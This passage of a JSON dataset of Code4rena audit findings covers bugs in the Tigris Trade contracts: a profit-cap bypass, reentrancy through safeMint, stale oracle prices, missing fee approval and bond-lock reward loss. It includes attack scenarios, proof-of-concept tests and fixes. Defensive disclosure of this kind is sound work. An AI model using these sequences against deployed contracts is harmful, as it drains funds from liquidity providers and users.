      "content": "\nUsers can bypass the `maxWinPercent` limit using a partial closing.\n\nAs a result, users can receive more funds than their upper limit from the protocol.\n\n### Proof of Concept\n\nAs we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.\n\n    Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\n\nAnd this logic was implemented like below in `_closePosition()`.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n```\n\nBut it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.\n\n1.  Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.\n2.  If `maxWinPercent` = 500%, Alice should receive 500 at most.\n3.  But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100`\n4.  After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.\n5.  As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\n\n### Recommended Mitigation Steps\n\nWe should check the `maxWinPercent` between the partial payout and partial margin like below.\n\n```solidity\n    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n\n    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++\n    if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { \n        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;\n    }\n```\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1364949926):**\n> I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1399445298):**\n > The Warden has shown how, by partially closing an order, it is possible to bypass the `maxWinPercent` cap.\n> \n> Per similar discussion to [#111](https://github.com/code-423n4/2022-12-tigris-findings/issues/111) the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.\n> \n> Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1407802166):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771 \n\n\n\n***\n\n",
      "summary": "\nThe report describes a bug in the Tigris Trade protocol where users can bypass the maximum profit limit by partially closing their position. This allows them to receive more funds than their limit from the protocol. The bug is caused by the logic implemented in the code, which checks the limit between the partial payout and full margin, rather than the partial margin. This allows users to repeatedly close a portion of their position and receive almost all of their initial profit, even though they should only receive a maximum of 500%. To fix this bug, the code should be updated to check the limit between the partial payout and partial margin. The severity of this bug is debated, with some labeling it as medium risk and others as high risk. The Tigris Trade team has resolved the issue by implementing the recommended mitigation steps.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/507",
      "tags": [],
      "finders": [
        "0xA5DF",
        "bin2chen",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "43150",
      "title": "[H-07] reentrancy attack during `mint()` function in Position contract which can lead to removing of the other user's limit orders or stealing contract funds because initId is set low value",
      "impact": "HIGH",
      "content": "\nFunction `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass `_checkDelay()` checks. Attacker can perform this action:\n\n1.  Call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code.\n2.  Call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.\n\n### Proof of Concept\n\nThis is `mint()` code in Position contract:\n\n        function mint(\n            MintTrade memory _mintTrade\n        ) external onlyMinter {\n            uint newTokenID = _tokenIds.current();\n\n            Trade storage newTrade = _trades[newTokenID];\n            newTrade.margin = _mintTrade.margin;\n            newTrade.leverage = _mintTrade.leverage;\n            newTrade.asset = _mintTrade.asset;\n            newTrade.direction = _mintTrade.direction;\n            newTrade.price = _mintTrade.price;\n            newTrade.tpPrice = _mintTrade.tp;\n            newTrade.slPrice = _mintTrade.sl;\n            newTrade.orderType = _mintTrade.orderType;\n            newTrade.id = newTokenID;\n            newTrade.tigAsset = _mintTrade.tigAsset;\n\n            _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage\n            if (_mintTrade.orderType > 0) { // update the values of some storage functions\n                _limitOrders[_mintTrade.asset].push(newTokenID);\n                _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n            } else {\n                initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n                _openPositions.push(newTokenID);\n                _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n                _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n                _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n            }\n            _tokenIds.increment();\n        }\n\nAs you can see by calling `_safeMint()`, code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. So code doesn't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.\n\nThere could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:\n\n**Scenario #1 where attacker removes other users limit orders and create broken storage state**\n\n1.  Attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1.\n2.  Then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check.\n3.  Variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list.\n4.  Attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`.\n5.  `cancelLimitOrder()` checks would pass and would try to call `Position.burn(ID1)`.\n6.  `burn()` function would try to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0, the code would remove the 0 index limit order which belongs to another user.\n7.  Execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.\n\nSo there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.\n\n**Scenario #2 where attacker steal contract/users funds by wrong profit calculation**\n\n1.  Attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low.\n2.  Code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address.\n3.  The value of `initId[ID1]` is not yet set for ID1.\n4.  Attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position.\n5.  Code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value would be based on the `newMargin`.\n6.  The execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value.\n7.  Then the value of `initId[ID1]` for attacker position would be very low, which would cause `accInterest` to be higher than it's supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.\n\nSo attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.\n\nThere can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nFollow the check-effect-interaction pattern.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/400)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1383811250):**\n> In contrast to other CEI reports, this report shows how control can be gained in the middle of the mint execution to create an inconsistent state.\n>\n> The warden has shown how, because `mint` doesn't follow CEI conventions, by reEntering via safeMint, an attacker can manipulate the state of limit orders, and also benefit by changing profit calculations.\n> \n> Because the finding shows how to break invariants and profit from it, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1407764413):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911 \n\n\n\n***\n\n",
      "summary": "\nThe function `Position.mint()` is used in two other functions, but it doesn't follow the check-effect-interaction pattern. This means that the values of certain variables are updated after an external call is made, which can create a wrong storage state and allow an attacker to manipulate the contract. This can result in the removal of other users' limit orders or the calculation of incorrect profits for the attacker. To fix this, the check-effect-interaction pattern should be followed and the code should be updated to prevent reentrancy attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/400",
      "tags": [],
      "finders": [
        "hihen",
        "rotcivegaf",
        "debo",
        "0xsomeone",
        "wait",
        "KingNFT",
        "stealthyz",
        "unforgiven",
        "mookimgo"
      ]
    },
    {
      "id": "6354",
      "title": "[M-24] Chainlink price feed is not sufficiently validated and can return stale price",
      "impact": "MEDIUM",
      "content": "\nAs mentioned by <https://docs.tigris.trade/protocol/oracle>, \"Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted.\" The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122>\n\n```solidity\n    function verifyPrice(\n        uint256 _validSignatureTimer,\n        uint256 _asset,\n        bool _chainlinkEnabled,\n        address _chainlinkFeed,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        mapping(address => bool) storage _isNode\n    )\n        external view\n    {\n        ...\n        if (_chainlinkEnabled && _chainlinkFeed != address(0)) {\n            int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n            if (assetChainlinkPriceInt != 0) {\n                uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n                require(\n                    _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n                    _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n                );\n            }\n        }\n    }\n```\n\nBased on <https://docs.chain.link/docs/historical-price-data>, the following can be done to avoid using a stale price returned by the Chainlink price feed.\n\n1.  The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function.\n2.  `roundId` and `answeredInRound` are also returned. \"You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.\"\n3.  \"A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.\"\n\n### Proof of Concept\n\nThe following steps can occur for the described scenario.\n\n1.  Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order.\n2.  When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset.\n3.  The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price.\n4.  Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113> can be updated to the following code.\n\n```solidity\n            (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();\n            require(answeredInRound >= roundId, \"price is stale\");\n            require(updatedAt > 0, \"round is incomplete\");\n```\n\n**[GainsGoblin (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1377551479):**\n > We don't want a trader's trade to revert just because the chainlink feed is a round behind.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1383083924):**\n > The Warden has pointed out to a possible risk related to the price oracle returning stale data.\n> \n> Alternatively to checking for latest round, a check for `updatedAt` to not be too far in the past should also help mitigate the risk of offering an incorrect price which can lead to value extraction or unintended behaviour.\n> \n> Because of the risk, I do agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1407824582):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177187 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `TradingLibrary.verifyPrice` function of the code-423n4/2022-12-tigris repository. This function is used to compare an off-chain price to a price returned by a Chainlink price feed. The problem is that the function uses Chainlink's deprecated `latestAnswer` function, which does not guarantee that the price returned by the Chainlink price feed is not stale. This means that if the off-chain price has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, making the price verification much less secure. \n\nTo avoid using a stale price returned by the Chainlink price feed, the `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. Additionally, `roundId` and `answeredInRound` are also returned, and can be checked against the current `roundId`. Finally, the timestamp on the round can be validated to make sure the round is complete.\n\nThe recommended mitigation step is to update the `TradingLibrary.verifyPrice` function to the code provided in the report. This code uses the `latestRoundData` function, checks the `roundId` and `answeredInRound` against the current `roundId`, and validates the timestamp on the round.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/655",
      "tags": [
        "Stale Price",
        "Oracle",
        "Chainlink"
      ],
      "finders": [
        "8olidity",
        "__141345__",
        "0x52",
        "fs0c",
        "Rolezn",
        "yixxas",
        "rbserver",
        "Jeiwan",
        "bin2chen",
        "joestakey",
        "ladboy233",
        "koxuan",
        "gzeon",
        "0xDecorativePineapple",
        "kwhuo68",
        "0xdeadbeef0x",
        "rvierdiiev",
        "eierina"
      ]
    },
    {
      "id": "6353",
      "title": "[M-23] Governance NFT holder, whose NFT was minted before Trading._handleOpenFees function is called, can lose deserved rewards after Trading._handleOpenFees function is called",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\n\n\n## Vulnerability details\n\n## Impact\nCalling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\n```solidity\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        ...\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            ...\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n```\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\n```solidity\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        ...\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n```\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\n```solidity\n    function distribute(address _tigAsset, uint _amount) external {\n        if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;\n        try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n            accRewardsPerNFT[_tigAsset] += _amount/totalSupply();\n        } catch {\n            return;\n        }\n    }\n```\n\n## Proof of Concept\nFunctions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.\n\nPlease add the following test in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.\n```typescript\n    it.only(\"Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called\", async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.\n      // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"0\");\n    });\n```\n\nFurthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\\Trading.sol`.\n```solidity\n689:     function _handleOpenFees(\n690:         uint _asset,\n691:         uint _positionSize,\n692:         address _trader,\n693:         address _tigAsset,\n694:         bool _isBot\n695:     )\n696:         internal\n697:         returns (uint _feePaid)\n698:     {\n699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n...\n732:         unchecked {\n733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n734:             _feePaid =\n735:                 _positionSize\n736:                 * (_fees.burnFees + _fees.botFees) // get total fee%\n737:                 / DIVISION_CONSTANT // divide by 100%\n738:                 + _daoFeesPaid;\n739:             emit FeesDistributed(\n740:                 _tigAsset,\n741:                 _daoFeesPaid,\n742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT,\n745:                 _referrer\n746:             );\n747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n748:         }\n749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose\n750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n751:     }\n```\n\nThen, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.\n```typescript\n    it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,\n             can receive deserved rewards after initiateMarketOrder function is called`, async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000\n      //   because her or his Governance NFT was minted before initiateMarketOrder function was called.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"10000000000000000000\");\n    });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749 can be updated to the following code.\n```solidity\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n```",
      "summary": "\nThis bug report is about the lack of approval when calling the `Trading._handleOpenFees` function which leads to the Governance NFT holder not receiving the rewards from the DAO fees generated by the trade. The `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, unlike the `Trading._handleCloseFees` function which executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. This lack of approval means that when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract.\n\nA Proof of Concept (POC) was provided to demonstrate the scenario. A test was suggested to be added in the `Signature verification` `describe` block in `test\\07.Trading.js` to pass and demonstrate the scenario. The suggested mitigation is to add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function in line 749 of `contracts\\Trading.sol`. A comparison test was also suggested to be added in the `Signature verification` `describe` block in `test\\07.Trading.js` to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation.\n\nThe tools used for this bug report is VSCode.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/649",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "bin2chen",
        "KingNFT",
        "HE1M",
        "stealthyz",
        "unforgiven"
      ]
    },
    {
      "id": "6352",
      "title": "[M-22] Unreleased locks cause the reward distribution to be flawed in BondNFT",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L150> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L225>\n\n### Impact\n\nAfter a lock has expired, it doesn't get any rewards distributed to it. But, unreleased locks cause other existing bonds to not receive the full amount of tokens either. The issue is that as long as the bond is not released, the `totalShares` value isn't updated. Everybody receives a smaller cut of the distribution. Thus, bond owners receive less rewards than they should.\n\nA bond can be released after it expired by the owner of it. If the owner doesn't release it for 7 days, anybody else can release it as well. As long as the owner doesn't release it, the issue will be in effect for at least 7 epochs.\n\nSince this causes a loss of funds for every bond holder I rate it as HIGH. It's likely to be an issue since you can't guarantee that bonds will be released the day they expire.\n\n### Proof of Concept\n\nHere's a test showcasing the issue:\n\n```js\n// 09.Bonds.js\n\n    it.only(\"test\", async function () {\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n      await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 100);\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"1000\"));\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"1000\"), 10);\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"1000\"));\n      await bond.distribute(stabletoken.address, ethers.utils.parseEther(\"1000\"));\n\n      await network.provider.send(\"evm_increaseTime\", [864000]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n\n      [,,,,,,,pending,,,] = await bond.idToBond(1);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n      [,,,,,,,pending,,,] = await bond.idToBond(2);\n      expect(pending).to.be.equals(\"499999999999999999986\");\n\n\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"1000\"));\n      await bond.distribute(stabletoken.address, ethers.utils.parseEther(\"1000\"));\n\n      await 